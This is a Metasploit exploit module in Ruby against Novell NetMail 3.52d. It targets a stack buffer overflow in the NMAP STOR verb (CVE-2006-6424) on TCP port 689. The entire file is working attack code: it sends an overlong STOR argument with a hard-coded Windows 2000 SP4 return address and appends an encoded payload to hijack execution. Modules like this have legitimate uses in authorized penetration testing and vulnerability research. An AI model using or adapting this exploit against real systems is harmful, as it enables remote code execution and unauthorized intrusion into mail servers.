require 'msf/core'

module Msf

class Exploits::Windows::Novell::Nmap_Stor < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Novell NetMail <= 3.52d NMAP STOR Buffer Overflow',
			'Description'    => %q{
				This module exploits a stack overflow in Novell's Netmail 3.52 NMAP STOR
				verb. By sending an overly long string, an attacker can overwrite the 
				buffer and control program execution. 
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 4886 $',
			'References'     =>
				[
					[ 'BID', '21725' ],
					[ 'CVE', '2006-6424' ],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 500,
					'BadChars' => "\x00\x0a\x0d\x20",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        => 
				[
					['Windows 2000 Pro SP4 English',   { 'Ret' => 0x7cdc97fb }], 
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Dec 23 2006'))

			register_options([Opt::RPORT(689)], self.class)

	end
	
	def exploit
		connect
		sock.get_once

		auth =  "USER " + rand_text_english(10)
		sock.put(auth + "\r\n")

		res = sock.get_once
		
		sploit =  "STOR " + rand_text_english(253) + [ target.ret ].pack('V')
		sploit << " " + rand_text_english(20) + "\r\n" + payload.encoded 

		if (res =~ /1000/)
			print_status("Trying target #{target.name}...")
			sock.put(sploit)
		else
			print_status("Not in Trusted Hosts.")
		end
		
		handler
		disconnect
	end
end
end	
